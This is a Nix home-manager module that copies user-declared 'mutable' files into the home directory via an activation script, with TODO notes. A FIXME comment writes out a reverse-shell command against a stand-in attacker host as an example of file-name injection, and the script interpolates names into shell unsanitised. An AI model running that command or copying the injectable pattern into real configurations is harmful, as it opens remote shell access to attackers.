# Module for provisioning mutable files that can change after build time
{
  config,
  lib,
  pkgs,
  ...
}: {
  options.custom.mutable = let
    inherit (lib) mkOption types;
  in {
    file = mkOption {
      type = types.attrsOf (types.submodule {
        options = {
          source = mkOption {
            type = types.path;
            description = "Path to the source file";
          };
        };
      });

      default = {};
      description = ''
        A set of mutable files that can change after build time.

        Key is the name of the file, value is a set with the source file path.

        Can only be regular files, not directories or symlinks.
      '';
    };
  };

  config = let
    cfg = config.custom.mutable;
  in {
    assertions = lib.attrsets.mapAttrsToList (name: value: {
      assertion = lib.filesystem.pathIsRegularFile value.source;
      message = "Mutable file ${name} must be a regular file, not a directory or symlink";
    }) cfg.file;

    # TODO: Copy files from a derivation to the user's home directory
    # TODO: Use this for VS code config
    # TODO: Check that the file hasn't been modified before overwriting (maybe preserve mtime during activation, and check for it before overwriting)
    # TODO: How to handle files that were modified after activation? Activation scripts
    # run on reboot and rebuild, so they could overwrite changes.
    # FIXME: This is super insecure, A reverse shell could be injected using a file named "${bash -i >& /dev/tcp/attacker.com/1234 0>&1}"
    home.activation.install-mutable = lib.hm.dag.entryAfter ["writeBoundary"] ''
        ${lib.concatStringsSep "\n" (lib.attrsets.mapAttrsToList (name: value: ''
          run cp --force "${value.source}" "${name}"
        '') cfg.file)}
      '';
  };
}
